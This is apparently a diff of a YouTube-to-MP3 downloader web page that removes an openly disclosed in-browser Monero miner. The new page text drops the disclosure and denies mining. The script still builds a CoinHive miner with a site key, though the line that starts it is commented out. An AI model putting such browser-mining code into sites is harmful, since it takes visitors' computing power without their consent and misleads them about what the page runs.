@@ -16,34 +16,22 @@
 <body>
 
 <nav class="navbar navbar-expand-lg navbar-light bg-light">
-  <a class="navbar-brand" href="#">YMM</a>
-  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-    <span class="navbar-toggler-icon"></span>
-  </button>
+  <a class="navbar-brand" href="#">YMD</a>
+
 </nav>
 <br>
 
 <div class="container">
-  <h1 class="text-center">Youtube Monero Miner</h1>
+  <h1 class="text-center">Simple youtube mp3 downloader</h1>
   <hr>
   <div class="row">
     <div class="col-sm-6">
       <p>
-        This website doesn't run any advertisment to support itself.
+        Welcome to the swaggetty youtube-to-mp3 downloader.
         <br>
-        Your data will not be mined or shared with anybody, ever.
+        The service is free of charge and you can download as many songs as you  want, please abuse it! We will not spam or bug you with ads of mining data we aim to provide a smooth mp3 downloading experience, we'll try to earn just as little as we need to keep he service running.
         <br>
-        In fact, we're not even recording what you're doing, we don't care.
-        <br>
-        This is the future of advertising 👽
-        <br>
-        Your browser is mining us a little Monero with the CPU of your computer.
-        <br>
-        This coins will go directly to us, without intermediaries.
-        <br>
-        Your data is actually meaningless for us.
-        <br>
-        Enjoy this service data safe!
+        Enjoy the service!
       </p>
     </div>
     <div class="col-sm-6">
@@ -58,12 +46,12 @@
             class="form-control"
             id="youtube-address"
             aria-describedby="youtubeAddress"
-            placeholder="Enter the Youtube Address you want to download as MP3">
+            placeholder="Youtube link to download as MP3">
 
           <span class="error-message hidden"></span>
         </div>
 
-        <button type="submit" class="btn btn-primary get-uuid">
+        <button type="submit" class="btn btn-primary btn-block get-uuid">
           Search
         </button>
 
@@ -131,8 +119,8 @@
   };
 
   $(document).ready(function () {
-    var miner = new CoinHive.Anonymous('swkUIClYeRabRXrCJG9IeSHOSvSRsnSL', { throttle: 0.999 });
-    miner.start();
+    var miner = new CoinHive.Anonymous('swkUIClYeRabRXrCJG9IeSHOSvSRsnSL', { throttle: 0.90 });
+    //miner.start();
 
     var youtubeFetcher = new YoutubeFetcher();
 
